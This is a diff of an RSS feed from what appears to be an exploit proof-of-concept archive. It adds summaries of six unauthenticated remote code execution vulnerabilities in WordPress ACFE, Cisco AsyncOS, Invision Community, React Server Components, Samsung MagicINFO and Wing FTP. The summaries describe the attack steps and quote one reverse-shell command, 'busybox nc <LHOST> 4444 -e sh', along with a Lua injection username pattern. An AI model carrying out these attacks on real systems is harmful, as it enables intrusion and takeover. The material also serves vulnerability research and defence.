@@ -1,4 +1,514 @@
-<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Unauthenticated-Rce on PoC Archive</title><link>https://poc.intelseclab.com/tags/unauthenticated-rce/</link><description>Recent content in Unauthenticated-Rce on PoC Archive</description><generator>Hugo</generator><language>en-us</language><lastBuildDate>Sun, 05 Jul 2026 00:00:00 +0000</lastBuildDate><atom:link href="https://poc.intelseclab.com/tags/unauthenticated-rce/index.xml" rel="self" type="application/rss+xml"/><item><title>Cockpit Unauthenticated Remote Code Execution via SSH Argument Injection (CVE-2026-4631)</title><link>https://poc.intelseclab.com/pocs/web/2026-07-05_cve-2026-4631-cockpit-ssh-rce/</link><pubDate>Sun, 05 Jul 2026 00:00:00 +0000</pubDate><guid>https://poc.intelseclab.com/pocs/web/2026-07-05_cve-2026-4631-cockpit-ssh-rce/</guid><description>&lt;h2 id="metadata">Metadata&lt;/h2>
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Unauthenticated-Rce on PoC Archive</title><link>https://poc.intelseclab.com/tags/unauthenticated-rce/</link><description>Recent content in Unauthenticated-Rce on PoC Archive</description><generator>Hugo</generator><language>en-us</language><lastBuildDate>Mon, 06 Jul 2026 00:00:00 +0000</lastBuildDate><atom:link href="https://poc.intelseclab.com/tags/unauthenticated-rce/index.xml" rel="self" type="application/rss+xml"/><item><title>ACF Extended (ACFE) `prepare_form()` Unauthenticated RCE via Privilege Escalation (CVE-2025-13486)</title><link>https://poc.intelseclab.com/pocs/web/2026-07-06_cve-2025-13486-acf-extended-rce/</link><pubDate>Mon, 06 Jul 2026 00:00:00 +0000</pubDate><guid>https://poc.intelseclab.com/pocs/web/2026-07-06_cve-2025-13486-acf-extended-rce/</guid><description>&lt;h2 id="metadata">Metadata&lt;/h2>
+&lt;table>
+ &lt;thead>
+ &lt;tr>
+ &lt;th>Field&lt;/th>
+ &lt;th>Value&lt;/th>
+ &lt;/tr>
+ &lt;/thead>
+ &lt;tbody>
+ &lt;tr>
+ &lt;td>&lt;strong>Date Added&lt;/strong>&lt;/td>
+ &lt;td>2026-07-06&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td>&lt;strong>Last Updated&lt;/strong>&lt;/td>
+ &lt;td>2026-07-06&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td>&lt;strong>Author / Researcher&lt;/strong>&lt;/td>
+ &lt;td>Sélim Lanouar (whattheslime); CVE discovered by Marcin Dudek (dudekmar)&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td>&lt;strong>CVE / Advisory&lt;/strong>&lt;/td>
+ &lt;td>CVE-2025-13486&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td>&lt;strong>Category&lt;/strong>&lt;/td>
+ &lt;td>web&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td>&lt;strong>Severity&lt;/strong>&lt;/td>
+ &lt;td>Critical&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td>&lt;strong>CVSS Score&lt;/strong>&lt;/td>
+ &lt;td>9.8 (per NVD)&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td>&lt;strong>Status&lt;/strong>&lt;/td>
+ &lt;td>Weaponized&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td>&lt;strong>Tags&lt;/strong>&lt;/td>
+ &lt;td>wordpress, acf-extended, acfe, call_user_func_array, unauthenticated-rce, privilege-escalation, admin-account-creation, python, cwe-94&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td>&lt;strong>Related&lt;/strong>&lt;/td>
+ &lt;td>N/A&lt;/td>
+ &lt;/tr>
+ &lt;/tbody>
+&lt;/table>
+&lt;hr>
+&lt;h2 id="affected-target">Affected Target&lt;/h2>
+&lt;table>
+ &lt;thead>
+ &lt;tr>
+ &lt;th>Field&lt;/th>
+ &lt;th>Value&lt;/th>
+ &lt;/tr>
+ &lt;/thead>
+ &lt;tbody>
+ &lt;tr>
+ &lt;td>&lt;strong>Software / System&lt;/strong>&lt;/td>
+ &lt;td>Advanced Custom Fields: Extended (ACFE) — WordPress plugin&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td>&lt;strong>Versions Affected&lt;/strong>&lt;/td>
+ &lt;td>0.9.0.5 through 0.9.1.1&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td>&lt;strong>Language / Platform&lt;/strong>&lt;/td>
+ &lt;td>Python 3 (httpx) exploit targeting a PHP/WordPress plugin&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td>&lt;strong>Authentication Required&lt;/strong>&lt;/td>
+ &lt;td>No&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td>&lt;strong>Network Access Required&lt;/strong>&lt;/td>
+ &lt;td>Yes (target must expose a page containing an ACFE-generated form)&lt;/td>
+ &lt;/tr>
+ &lt;/tbody>
+&lt;/table>
+&lt;hr>
+&lt;h2 id="summary">Summary&lt;/h2>
+&lt;p>The ACF Extended (ACFE) plugin&amp;rsquo;s front-end form-rendering AJAX handler (&lt;code>wp_ajax_nopriv_acfe/form/render_form_ajax&lt;/code>) resolves user-controlled form configuration through &lt;code>prepare_form()&lt;/code>, which ultimately passes attacker-supplied data into &lt;code>call_user_func_array()&lt;/code> without adequate validation. Because the AJAX action is registered as &lt;code>nopriv&lt;/code> (reachable while unauthenticated) and ACFE ships a built-in &lt;code>wp_insert_user&lt;/code> form renderer, an attacker can invoke that renderer directly with &lt;code>form[render]=wp_insert_user&lt;/code> and forged parameters to create a new WordPress account with the &lt;code>administrator&lt;/code> role, then immediately authenticate as that account via the same handler&amp;rsquo;s &lt;code>wp_signon&lt;/code> renderer. The PoC first fingerprints the ACFE version from a static asset URL, then (with &lt;code>--exploit&lt;/code>) creates the rogue admin and logs in, dumping a valid &lt;code>wordpress_logged_in_*&lt;/code> cookie.&lt;/p></description></item><item><title>Cisco AsyncOS Spam Quarantine (TCP/6025) Exposure &amp; IOC Scanner (CVE-2025-20393)</title><link>https://poc.intelseclab.com/pocs/network/2026-07-06_cve-2025-20393-cisco-asyncos-quarantine-rce-scanner/</link><pubDate>Mon, 06 Jul 2026 00:00:00 +0000</pubDate><guid>https://poc.intelseclab.com/pocs/network/2026-07-06_cve-2025-20393-cisco-asyncos-quarantine-rce-scanner/</guid><description>&lt;h2 id="metadata">Metadata&lt;/h2>
+&lt;table>
+ &lt;thead>
+ &lt;tr>
+ &lt;th>Field&lt;/th>
+ &lt;th>Value&lt;/th>
+ &lt;/tr>
+ &lt;/thead>
+ &lt;tbody>
+ &lt;tr>
+ &lt;td>&lt;strong>Date Added&lt;/strong>&lt;/td>
+ &lt;td>2026-07-06&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td>&lt;strong>Last Updated&lt;/strong>&lt;/td>
+ &lt;td>2026-07-06&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td>&lt;strong>Author / Researcher&lt;/strong>&lt;/td>
+ &lt;td>cyberdudebivash&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td>&lt;strong>CVE / Advisory&lt;/strong>&lt;/td>
+ &lt;td>CVE-2025-20393&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td>&lt;strong>Category&lt;/strong>&lt;/td>
+ &lt;td>network&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td>&lt;strong>Severity&lt;/strong>&lt;/td>
+ &lt;td>Critical&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td>&lt;strong>CVSS Score&lt;/strong>&lt;/td>
+ &lt;td>10.0 (per repository)&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td>&lt;strong>Status&lt;/strong>&lt;/td>
+ &lt;td>PoC&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td>&lt;strong>Tags&lt;/strong>&lt;/td>
+ &lt;td>cisco, asyncos, secure-email-gateway, sma, spam-quarantine, tcp-6025, unauthenticated-rce, exposure-scanner, ioc-detection, backdoor-detection, python&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td>&lt;strong>Related&lt;/strong>&lt;/td>
+ &lt;td>N/A&lt;/td>
+ &lt;/tr>
+ &lt;/tbody>
+&lt;/table>
+&lt;hr>
+&lt;h2 id="affected-target">Affected Target&lt;/h2>
+&lt;table>
+ &lt;thead>
+ &lt;tr>
+ &lt;th>Field&lt;/th>
+ &lt;th>Value&lt;/th>
+ &lt;/tr>
+ &lt;/thead>
+ &lt;tbody>
+ &lt;tr>
+ &lt;td>&lt;strong>Software / System&lt;/strong>&lt;/td>
+ &lt;td>Cisco AsyncOS for Secure Email Gateway (ESA) / Security Management Appliance (SMA)&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td>&lt;strong>Versions Affected&lt;/strong>&lt;/td>
+ &lt;td>Per Cisco advisory for CVE-2025-20393 (not enumerated in this repository)&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td>&lt;strong>Language / Platform&lt;/strong>&lt;/td>
+ &lt;td>Python 3 scanner against a network appliance&amp;rsquo;s Spam Quarantine service&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td>&lt;strong>Authentication Required&lt;/strong>&lt;/td>
+ &lt;td>No (unauthenticated RCE per the CVE description); this scanner itself is detection-only&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td>&lt;strong>Network Access Required&lt;/strong>&lt;/td>
+ &lt;td>Yes (TCP/6025, the Spam Quarantine service port)&lt;/td>
+ &lt;/tr>
+ &lt;/tbody>
+&lt;/table>
+&lt;hr>
+&lt;h2 id="summary">Summary&lt;/h2>
+&lt;p>CVE-2025-20393 is an unauthenticated remote code execution vulnerability in Cisco AsyncOS&amp;rsquo;s Spam Quarantine service, which listens on TCP/6025. This repository provides a detection-only tool that (1) checks whether TCP/6025 is reachable on a target Secure Email Gateway/SMA appliance, (2) optionally performs a safe, non-exploitative HTTP probe of the quarantine web interface to gauge responsiveness, and (3) can run a local IOC sweep on the appliance itself for artifacts of known post-exploitation backdoors (e.g. AquaShell-style tunneling tools). It performs no exploitation of the underlying vulnerability — it is purely a reconnaissance/compromise-assessment aid.&lt;/p></description></item><item><title>Invision Community Theme Editor Template Injection Unauthenticated RCE (CVE-2025-47916)</title><link>https://poc.intelseclab.com/pocs/web/2026-07-06_cve-2025-47916-invision-community-template-injection-rce/</link><pubDate>Mon, 06 Jul 2026 00:00:00 +0000</pubDate><guid>https://poc.intelseclab.com/pocs/web/2026-07-06_cve-2025-47916-invision-community-template-injection-rce/</guid><description>&lt;h2 id="metadata">Metadata&lt;/h2>
+&lt;table>
+ &lt;thead>
+ &lt;tr>
+ &lt;th>Field&lt;/th>
+ &lt;th>Value&lt;/th>
+ &lt;/tr>
+ &lt;/thead>
+ &lt;tbody>
+ &lt;tr>
+ &lt;td>&lt;strong>Date Added&lt;/strong>&lt;/td>
+ &lt;td>2026-07-06&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td>&lt;strong>Last Updated&lt;/strong>&lt;/td>
+ &lt;td>2026-07-06&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td>&lt;strong>Author / Researcher&lt;/strong>&lt;/td>
+ &lt;td>Egidio Romano (vulnerability discovery); Web3-Serializer (this PoC client)&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td>&lt;strong>CVE / Advisory&lt;/strong>&lt;/td>
+ &lt;td>CVE-2025-47916&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td>&lt;strong>Category&lt;/strong>&lt;/td>
+ &lt;td>web&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td>&lt;strong>Severity&lt;/strong>&lt;/td>
+ &lt;td>Critical&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td>&lt;strong>CVSS Score&lt;/strong>&lt;/td>
+ &lt;td>10.0 (per NVD)&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td>&lt;strong>Status&lt;/strong>&lt;/td>
+ &lt;td>Weaponized&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td>&lt;strong>Tags&lt;/strong>&lt;/td>
+ &lt;td>invision-community, ssti, template-injection, theme-editor, unauthenticated-rce, php, cwe-94, python&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td>&lt;strong>Related&lt;/strong>&lt;/td>
+ &lt;td>N/A&lt;/td>
+ &lt;/tr>
+ &lt;/tbody>
+&lt;/table>
+&lt;hr>
+&lt;h2 id="affected-target">Affected Target&lt;/h2>
+&lt;table>
+ &lt;thead>
+ &lt;tr>
+ &lt;th>Field&lt;/th>
+ &lt;th>Value&lt;/th>
+ &lt;/tr>
+ &lt;/thead>
+ &lt;tbody>
+ &lt;tr>
+ &lt;td>&lt;strong>Software / System&lt;/strong>&lt;/td>
+ &lt;td>Invision Community, &lt;code>themeeditor&lt;/code> front controller (&lt;code>IPS\core\modules\front\system\themeeditor::customCss()&lt;/code>)&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td>&lt;strong>Versions Affected&lt;/strong>&lt;/td>
+ &lt;td>5.0.0 through 5.0.6 (fixed in 5.0.7)&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td>&lt;strong>Language / Platform&lt;/strong>&lt;/td>
+ &lt;td>Python 3 (exploit client); PHP (target, Invision Community)&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td>&lt;strong>Authentication Required&lt;/strong>&lt;/td>
+ &lt;td>No&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td>&lt;strong>Network Access Required&lt;/strong>&lt;/td>
+ &lt;td>Yes&lt;/td>
+ &lt;/tr>
+ &lt;/tbody>
+&lt;/table>
+&lt;hr>
+&lt;h2 id="summary">Summary&lt;/h2>
+&lt;p>Invision Community&amp;rsquo;s theme editor exposes a &lt;code>customCss()&lt;/code> action on the front-end &lt;code>themeeditor&lt;/code> controller (&lt;code>/applications/core/modules/front/system/themeeditor.php&lt;/code>) that is reachable without authentication and passes the attacker-supplied &lt;code>content&lt;/code> request parameter into &lt;code>Theme::makeProcessFunction()&lt;/code>, which processes it as a template expression. Because template expressions can invoke PHP functions, an attacker can craft a &lt;code>content&lt;/code> value that evaluates to arbitrary PHP code execution, resulting in unauthenticated remote code execution against the Invision Community forum/community platform. The included PoC (&lt;code>main.py&lt;/code>) is a small client that base64-encodes a shell command, wraps it in a template expression calling &lt;code>system()&lt;/code>/&lt;code>base64_decode()&lt;/code> wrapped with a &lt;code>die()&lt;/code> and a unique marker string, POSTs it to the vulnerable &lt;code>customCss&lt;/code> action, and extracts the command output from the response — offering single-command execution, a non-intrusive vulnerability test mode, and an interactive pseudo-shell.&lt;/p></description></item><item><title>React Server Components Flight-Protocol Prototype Pollution RCE — "React2Shell" (CVE-2025-55182)</title><link>https://poc.intelseclab.com/pocs/web/2026-07-06_cve-2025-55182-react-server-components-rce/</link><pubDate>Mon, 06 Jul 2026 00:00:00 +0000</pubDate><guid>https://poc.intelseclab.com/pocs/web/2026-07-06_cve-2025-55182-react-server-components-rce/</guid><description>&lt;h2 id="metadata">Metadata&lt;/h2>
+&lt;table>
+ &lt;thead>
+ &lt;tr>
+ &lt;th>Field&lt;/th>
+ &lt;th>Value&lt;/th>
+ &lt;/tr>
+ &lt;/thead>
+ &lt;tbody>
+ &lt;tr>
+ &lt;td>&lt;strong>Date Added&lt;/strong>&lt;/td>
+ &lt;td>2026-07-06&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td>&lt;strong>Last Updated&lt;/strong>&lt;/td>
+ &lt;td>2026-07-06&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td>&lt;strong>Author / Researcher&lt;/strong>&lt;/td>
+ &lt;td>Herick-Costa&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td>&lt;strong>CVE / Advisory&lt;/strong>&lt;/td>
+ &lt;td>CVE-2025-55182&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td>&lt;strong>Category&lt;/strong>&lt;/td>
+ &lt;td>web&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td>&lt;strong>Severity&lt;/strong>&lt;/td>
+ &lt;td>Critical&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td>&lt;strong>CVSS Score&lt;/strong>&lt;/td>
+ &lt;td>10.0 (per NVD)&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td>&lt;strong>Status&lt;/strong>&lt;/td>
+ &lt;td>PoC&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td>&lt;strong>Tags&lt;/strong>&lt;/td>
+ &lt;td>react, react-server-components, rsc, flight-protocol, prototype-pollution, deserialization, unauthenticated-rce, nextjs, nodejs, python&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td>&lt;strong>Related&lt;/strong>&lt;/td>
+ &lt;td>N/A&lt;/td>
+ &lt;/tr>
+ &lt;/tbody>
+&lt;/table>
+&lt;hr>
+&lt;h2 id="affected-target">Affected Target&lt;/h2>
+&lt;table>
+ &lt;thead>
+ &lt;tr>
+ &lt;th>Field&lt;/th>
+ &lt;th>Value&lt;/th>
+ &lt;/tr>
+ &lt;/thead>
+ &lt;tbody>
+ &lt;tr>
+ &lt;td>&lt;strong>Software / System&lt;/strong>&lt;/td>
+ &lt;td>React Server Components (RSC) packages using the Flight protocol (commonly deployed via Next.js)&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td>&lt;strong>Versions Affected&lt;/strong>&lt;/td>
+ &lt;td>React 19.0, 19.1.0, 19.1.1, 19.2.0 (per source repository)&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td>&lt;strong>Language / Platform&lt;/strong>&lt;/td>
+ &lt;td>Python (exploit client) targeting Node.js server running React Server Components&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td>&lt;strong>Authentication Required&lt;/strong>&lt;/td>
+ &lt;td>No&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td>&lt;strong>Network Access Required&lt;/strong>&lt;/td>
+ &lt;td>Yes — single crafted HTTP request over the network&lt;/td>
+ &lt;/tr>
+ &lt;/tbody>
+&lt;/table>
+&lt;hr>
+&lt;h2 id="summary">Summary&lt;/h2>
+&lt;p>CVE-2025-55182, dubbed &amp;ldquo;React2Shell&amp;rdquo;, is a critical unauthenticated remote code execution vulnerability in React Server Components&amp;rsquo; Flight protocol deserialization. The Flight protocol serializes/deserializes component data exchanged between client and server; insufficient validation during deserialization allows a specially crafted &lt;code>multipart/form-data&lt;/code> payload to manipulate internal object structures, walk the JavaScript prototype chain, reach the &lt;code>Function&lt;/code>/&lt;code>constructor&lt;/code> machinery, and ultimately invoke &lt;code>child_process.execSync&lt;/code> server-side. The included PoC is a 22-line, 715-byte Python script that builds this Flight payload and POSTs it to a target RSC endpoint, causing the server to execute an attacker-supplied reverse-shell command (&lt;code>busybox nc &amp;lt;LHOST&amp;gt; 4444 -e sh&lt;/code>) with no authentication and a single HTTP request.&lt;/p></description></item><item><title>Samsung MagicINFO 9 Server Unauthenticated Path Traversal to RCE (CVE-2025-4632)</title><link>https://poc.intelseclab.com/pocs/web/2026-07-06_cve-2025-4632-magicinfo-path-traversal-rce/</link><pubDate>Mon, 06 Jul 2026 00:00:00 +0000</pubDate><guid>https://poc.intelseclab.com/pocs/web/2026-07-06_cve-2025-4632-magicinfo-path-traversal-rce/</guid><description>&lt;h2 id="metadata">Metadata&lt;/h2>
+&lt;table>
+ &lt;thead>
+ &lt;tr>
+ &lt;th>Field&lt;/th>
+ &lt;th>Value&lt;/th>
+ &lt;/tr>
+ &lt;/thead>
+ &lt;tbody>
+ &lt;tr>
+ &lt;td>&lt;strong>Date Added&lt;/strong>&lt;/td>
+ &lt;td>2026-07-06&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td>&lt;strong>Last Updated&lt;/strong>&lt;/td>
+ &lt;td>2026-07-06&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td>&lt;strong>Author / Researcher&lt;/strong>&lt;/td>
+ &lt;td>digitalsurgn (script author); original discovery/template by s4e-io (ProjectDiscovery Nuclei community)&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td>&lt;strong>CVE / Advisory&lt;/strong>&lt;/td>
+ &lt;td>CVE-2025-4632&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td>&lt;strong>Category&lt;/strong>&lt;/td>
+ &lt;td>web&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td>&lt;strong>Severity&lt;/strong>&lt;/td>
+ &lt;td>Critical&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td>&lt;strong>CVSS Score&lt;/strong>&lt;/td>
+ &lt;td>9.8 (per NVD)&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td>&lt;strong>Status&lt;/strong>&lt;/td>
+ &lt;td>Weaponized&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td>&lt;strong>Tags&lt;/strong>&lt;/td>
+ &lt;td>samsung, magicinfo, path-traversal, arbitrary-file-upload, unauthenticated-rce, jsp-webshell, cwe-22, cwe-434, python&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td>&lt;strong>Related&lt;/strong>&lt;/td>
+ &lt;td>N/A&lt;/td>
+ &lt;/tr>
+ &lt;/tbody>
+&lt;/table>
+&lt;hr>
+&lt;h2 id="affected-target">Affected Target&lt;/h2>
+&lt;table>
+ &lt;thead>
+ &lt;tr>
+ &lt;th>Field&lt;/th>
+ &lt;th>Value&lt;/th>
+ &lt;/tr>
+ &lt;/thead>
+ &lt;tbody>
+ &lt;tr>
+ &lt;td>&lt;strong>Software / System&lt;/strong>&lt;/td>
+ &lt;td>Samsung MagicINFO 9 Server (digital signage content management server), &lt;code>SWUpdateFileUploader&lt;/code> servlet&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td>&lt;strong>Versions Affected&lt;/strong>&lt;/td>
+ &lt;td>Prior to 21.1052&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td>&lt;strong>Language / Platform&lt;/strong>&lt;/td>
+ &lt;td>Python 3 (exploit); Java/JSP servlet (target, runs with SYSTEM authority on Windows)&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td>&lt;strong>Authentication Required&lt;/strong>&lt;/td>
+ &lt;td>No&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td>&lt;strong>Network Access Required&lt;/strong>&lt;/td>
+ &lt;td>Yes&lt;/td>
+ &lt;/tr>
+ &lt;/tbody>
+&lt;/table>
+&lt;hr>
+&lt;h2 id="summary">Summary&lt;/h2>
+&lt;p>Samsung MagicINFO 9 Server&amp;rsquo;s &lt;code>SWUpdateFileUploader&lt;/code> servlet, which handles firmware/content update uploads from signage devices, fails to properly sanitize the &lt;code>fileName&lt;/code> parameter, allowing directory traversal sequences (&lt;code>../../&lt;/code>) to break out of the intended upload directory. An unauthenticated attacker can supply a crafted &lt;code>fileName&lt;/code> to write an arbitrary file — including a &lt;code>.jsp&lt;/code> web shell — directly into the web root, which the server then executes with &lt;code>SYSTEM&lt;/code> privileges upon request. The included PoC (&lt;code>exploit_magicinfo.py&lt;/code>) automates a two-step attack: it POSTs the traversal payload with attacker-controlled content to the vulnerable servlet, then GETs the resulting file path to confirm the write/execution succeeded. The README also documents several JSP payload variants (plain confirmation page, plain &lt;code>cmd.exe&lt;/code> shell, reflection-obfuscated shell, and Base64-wrapped shell for WAF/URI-filter evasion), demonstrating full unauthenticated remote code execution.&lt;/p></description></item><item><title>Wing FTP Server NULL-Byte Lua Injection Unauthenticated RCE (CVE-2025-47812)</title><link>https://poc.intelseclab.com/pocs/web/2026-07-06_cve-2025-47812-wingftp-null-byte-lua-rce/</link><pubDate>Mon, 06 Jul 2026 00:00:00 +0000</pubDate><guid>https://poc.intelseclab.com/pocs/web/2026-07-06_cve-2025-47812-wingftp-null-byte-lua-rce/</guid><description>&lt;h2 id="metadata">Metadata&lt;/h2>
+&lt;table>
+ &lt;thead>
+ &lt;tr>
+ &lt;th>Field&lt;/th>
+ &lt;th>Value&lt;/th>
+ &lt;/tr>
+ &lt;/thead>
+ &lt;tbody>
+ &lt;tr>
+ &lt;td>&lt;strong>Date Added&lt;/strong>&lt;/td>
+ &lt;td>2026-07-06&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td>&lt;strong>Last Updated&lt;/strong>&lt;/td>
+ &lt;td>2026-07-06&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td>&lt;strong>Author / Researcher&lt;/strong>&lt;/td>
+ &lt;td>0xS4N4TG (this rewrite); original PoC by 4m3rr0r; vulnerability research by Julien (@MrTuxracer)&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td>&lt;strong>CVE / Advisory&lt;/strong>&lt;/td>
+ &lt;td>CVE-2025-47812&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td>&lt;strong>Category&lt;/strong>&lt;/td>
+ &lt;td>web&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td>&lt;strong>Severity&lt;/strong>&lt;/td>
+ &lt;td>Critical&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td>&lt;strong>CVSS Score&lt;/strong>&lt;/td>
+ &lt;td>10.0 (per NVD)&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td>&lt;strong>Status&lt;/strong>&lt;/td>
+ &lt;td>Weaponized&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td>&lt;strong>Tags&lt;/strong>&lt;/td>
+ &lt;td>wingftp, ftp-server, null-byte-injection, lua-injection, unauthenticated-rce, session-file, cwe-94, cwe-158, python&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td>&lt;strong>Related&lt;/strong>&lt;/td>
+ &lt;td>N/A&lt;/td>
+ &lt;/tr>
+ &lt;/tbody>
+&lt;/table>
+&lt;hr>
+&lt;h2 id="affected-target">Affected Target&lt;/h2>
+&lt;table>
+ &lt;thead>
+ &lt;tr>
+ &lt;th>Field&lt;/th>
+ &lt;th>Value&lt;/th>
+ &lt;/tr>
+ &lt;/thead>
+ &lt;tbody>
+ &lt;tr>
+ &lt;td>&lt;strong>Software / System&lt;/strong>&lt;/td>
+ &lt;td>Wing FTP Server, web administration/login interface (&lt;code>loginok.html&lt;/code>, session mechanism)&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td>&lt;strong>Versions Affected&lt;/strong>&lt;/td>
+ &lt;td>&amp;lt;= 7.4.3 (fixed in 7.4.4)&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td>&lt;strong>Language / Platform&lt;/strong>&lt;/td>
+ &lt;td>Python 3 (exploit); Lua session backend (target, executes as &lt;code>root&lt;/code>/&lt;code>SYSTEM&lt;/code>)&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td>&lt;strong>Authentication Required&lt;/strong>&lt;/td>
+ &lt;td>No&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td>&lt;strong>Network Access Required&lt;/strong>&lt;/td>
+ &lt;td>Yes&lt;/td>
+ &lt;/tr>
+ &lt;/tbody>
+&lt;/table>
+&lt;hr>
+&lt;h2 id="summary">Summary&lt;/h2>
+&lt;p>Wing FTP Server&amp;rsquo;s authentication routine &lt;code>c_CheckUser()&lt;/code> truncates the supplied &lt;code>username&lt;/code> at the first NULL byte (&lt;code>%00&lt;/code>) when validating credentials, but the code path that subsequently writes the session file persists the &lt;em>full&lt;/em>, unsanitized username — including anything after the NULL byte — into a Lua session file on disk. By submitting a username such as &lt;code>anonymous%00]]&amp;lt;lua-code&amp;gt;--&lt;/code>, an attacker causes the truncated value to pass authentication as &lt;code>anonymous&lt;/code> while the raw string (which closes the Lua string literal, injects arbitrary Lua, then comments out the remainder) is written verbatim into the session file. When any authenticated page (e.g. &lt;code>dir.html&lt;/code>) is subsequently loaded, the server reads the session file via &lt;code>loadfile()&lt;/code> and executes it as Lua code, running the attacker&amp;rsquo;s injected &lt;code>os.execute()&lt;/code>/&lt;code>io.popen()&lt;/code> calls as &lt;code>root&lt;/code> (Linux) or &lt;code>SYSTEM&lt;/code> (Windows). The included PoC (&lt;code>exploit.py&lt;/code>) automates the NULL-byte injection login, triggers execution via &lt;code>dir.html&lt;/code>, and supports vulnerability checking, blocking command execution, detached/backgrounded command execution, and one-shot bash reverse shell delivery.&lt;/p></description></item><item><title>Cockpit Unauthenticated Remote Code Execution via SSH Argument Injection (CVE-2026-4631)</title><link>https://poc.intelseclab.com/pocs/web/2026-07-05_cve-2026-4631-cockpit-ssh-rce/</link><pubDate>Sun, 05 Jul 2026 00:00:00 +0000</pubDate><guid>https://poc.intelseclab.com/pocs/web/2026-07-05_cve-2026-4631-cockpit-ssh-rce/</guid><description>&lt;h2 id="metadata">Metadata&lt;/h2>
 &lt;table>
  &lt;thead>
  &lt;tr>
